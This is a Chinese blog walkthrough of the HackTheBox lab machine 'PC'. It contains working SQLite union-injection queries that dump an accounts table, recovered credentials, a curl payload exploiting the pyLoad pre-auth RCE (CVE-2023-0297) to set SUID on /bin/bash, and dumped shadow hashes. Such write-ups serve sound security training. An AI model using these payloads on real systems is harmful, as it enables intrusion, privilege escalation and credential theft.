---
title: PC - HackTheBox
url: https://darkwing.moe/2023/05/22/PC-HackTheBox/
source: 喵喵喵喵
date: 2023-05-23
fetch_date: 2025-10-04T11:36:35.957569
---

# PC - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

PC - HackTheBox

# PC - HackTheBox

##### 2023-05-22

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
3. [3. gRPC 50051](#gRPC-50051)
4. [4. SimpleApp](#SimpleApp)
   1. [4.1. LoginUser](#LoginUser)
   2. [4.2. getinfo](#getinfo)
5. [5. sql注入](#sql注入)
6. [6. user flag](#user-flag)
7. [7. 提权信息](#提权信息)
8. [8. 提权 & root flag](#提权-amp-root-flag)
   1. [8.1. shadow](#shadow)
9. [9. 参考资料](#参考资料)

# PC - HackTheBox

2023-05-22

# 基本信息

* <https://app.hackthebox.com/machines/PC>
* 10.10.11.214

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052201.jpg)

# 端口扫描

需要全端口,有个50051：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` $ nmap -p- -Pn 10.10.11.214 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 16:01 CST Stats: 0:48:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 98.24% done; ETC: 16:50 (0:00:52 remaining) Nmap scan report for 10.10.11.214 Host is up (0.093s latency). Not shown: 65533 filtered tcp ports (no-response) PORT      STATE SERVICE 22/tcp    open  ssh 50051/tcp open  unknown  Nmap done: 1 IP address (1 host up) scanned in 2940.26 seconds ``` |

# gRPC 50051

搜索可以知道50051是gRPC:

* GRPC Core: gRPC Server Reflection Tutorial
  <https://grpc.github.io/grpc/core/md_doc_server_reflection_tutorial.html>

可以直接使用grpcui图形界面进行交互：

* fullstorydev/grpcui: An interactive web UI for gRPC, along the lines of postman
  <https://github.com/fullstorydev/grpcui>

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` brew install grpcui grpcui -plaintext 10.10.11.214:50051 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052202.jpg)

# SimpleApp

## LoginUser

直接使用 `admin : admin`登录，得到一个id和token：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` {   "message": "Your id is 678." }  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3NTMxNjN9.5ZKS24POhkcG5Cn1zYcGnV4E70CbFH6gcsEflzMDzvU ``` |

(下面的图是一开始自己注册登录得到的结果，懒得改成admin了)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052203.jpg)

## getinfo

然后使用得到的id和token调用getinfo：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052204.jpg)

# sql注入

简单测试发现id处存在注入：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052205.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052206.jpg)

后面就一步步注入获取数据，sqlite数据库：

* PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub
  <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` 678 union select sqlite_version()  678 union SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' accounts  678 union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts' CREATE TABLE "accounts" (username TEXT UNIQUE,password TEXT)  678 union SELECT GROUP_CONCAT(username) from accounts admin,sau 678 union SELECT GROUP_CONCAT(password) from accounts admin,HereIsYourPassWord1431 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052207.jpg)

# user flag

得到的sau用户账号密码，ssh登录：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` sau HereIsYourPassWord1431 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052208.jpg)

# 提权信息

简单枚举发现本地8000端口：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052209.jpg)

转发出来查看，发现是pyLoad：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052210.jpg)

搜索可以发现相关漏洞：

* Pre-auth RCE vulnerability found in pyload
  <https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/>
* bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad: CVE-2023-0297: The Story of Finding Pre-auth RCE in pyLoad
  <https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad>

# 提权 & root flag

最简单的，直接给bash加个suid,注意编码：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` curl -i -s -k -X $'POST' \     --data-binary $'jk=pyimport%20os;os.system(\"chmod%20%2bs%20/bin/bash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \     $'http://127.0.0.1:8000/flash/addcrypted2' ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052211.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023052212.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$6$DyP1KfBYGKoKi9P1$UiRaoILBpT81btxBn3Hzd5KmsRiijiMcR8J/F7ULWYvIMVzicsE3s/Yfyd20bypQUJ4utbJMRzYip4HT0s9ri.:19368:0:99999:7::: sau:$6$Gx2uZX1oO0Qx6c3z$DUQFBRdrpJRsMo098RVb/o.QDhL.n9aKWRdjNrrn6VU4fnBkuhBOnjPz.Oiua5ZswZMrVn3UwfSje/fUWkJYv.:19368:0:99999:7::: ``` |

# 参考资料

* GRPC Core: gRPC Server Reflection Tutorial
  <https://grpc.github.io/grpc/core/md_doc_server_reflection_tutorial.html>
* fullstorydev/grpcui: An interactive web UI for gRPC, along the lines of postman
  <https://github.com/fullstorydev/grpcui>
* PayloadsAllTheThings/SQLite Injection.md at master · swisskyrepo/PayloadsAllTheThings · GitHub
  <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md>
* Pre-auth RCE vulnerability found in pyload
  <https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/>
* bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad: CVE-2023-0297: The Story of Finding Pre-auth RCE in pyLoad
  <https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad>

> Last updated: 2023-10-09 08:28:26
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Bookworm - HackTheBox](/2023/05/29/Bookworm-HackTheBox/)

[Next

#### Format - HackTheBox](/2023/05/15/Format-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)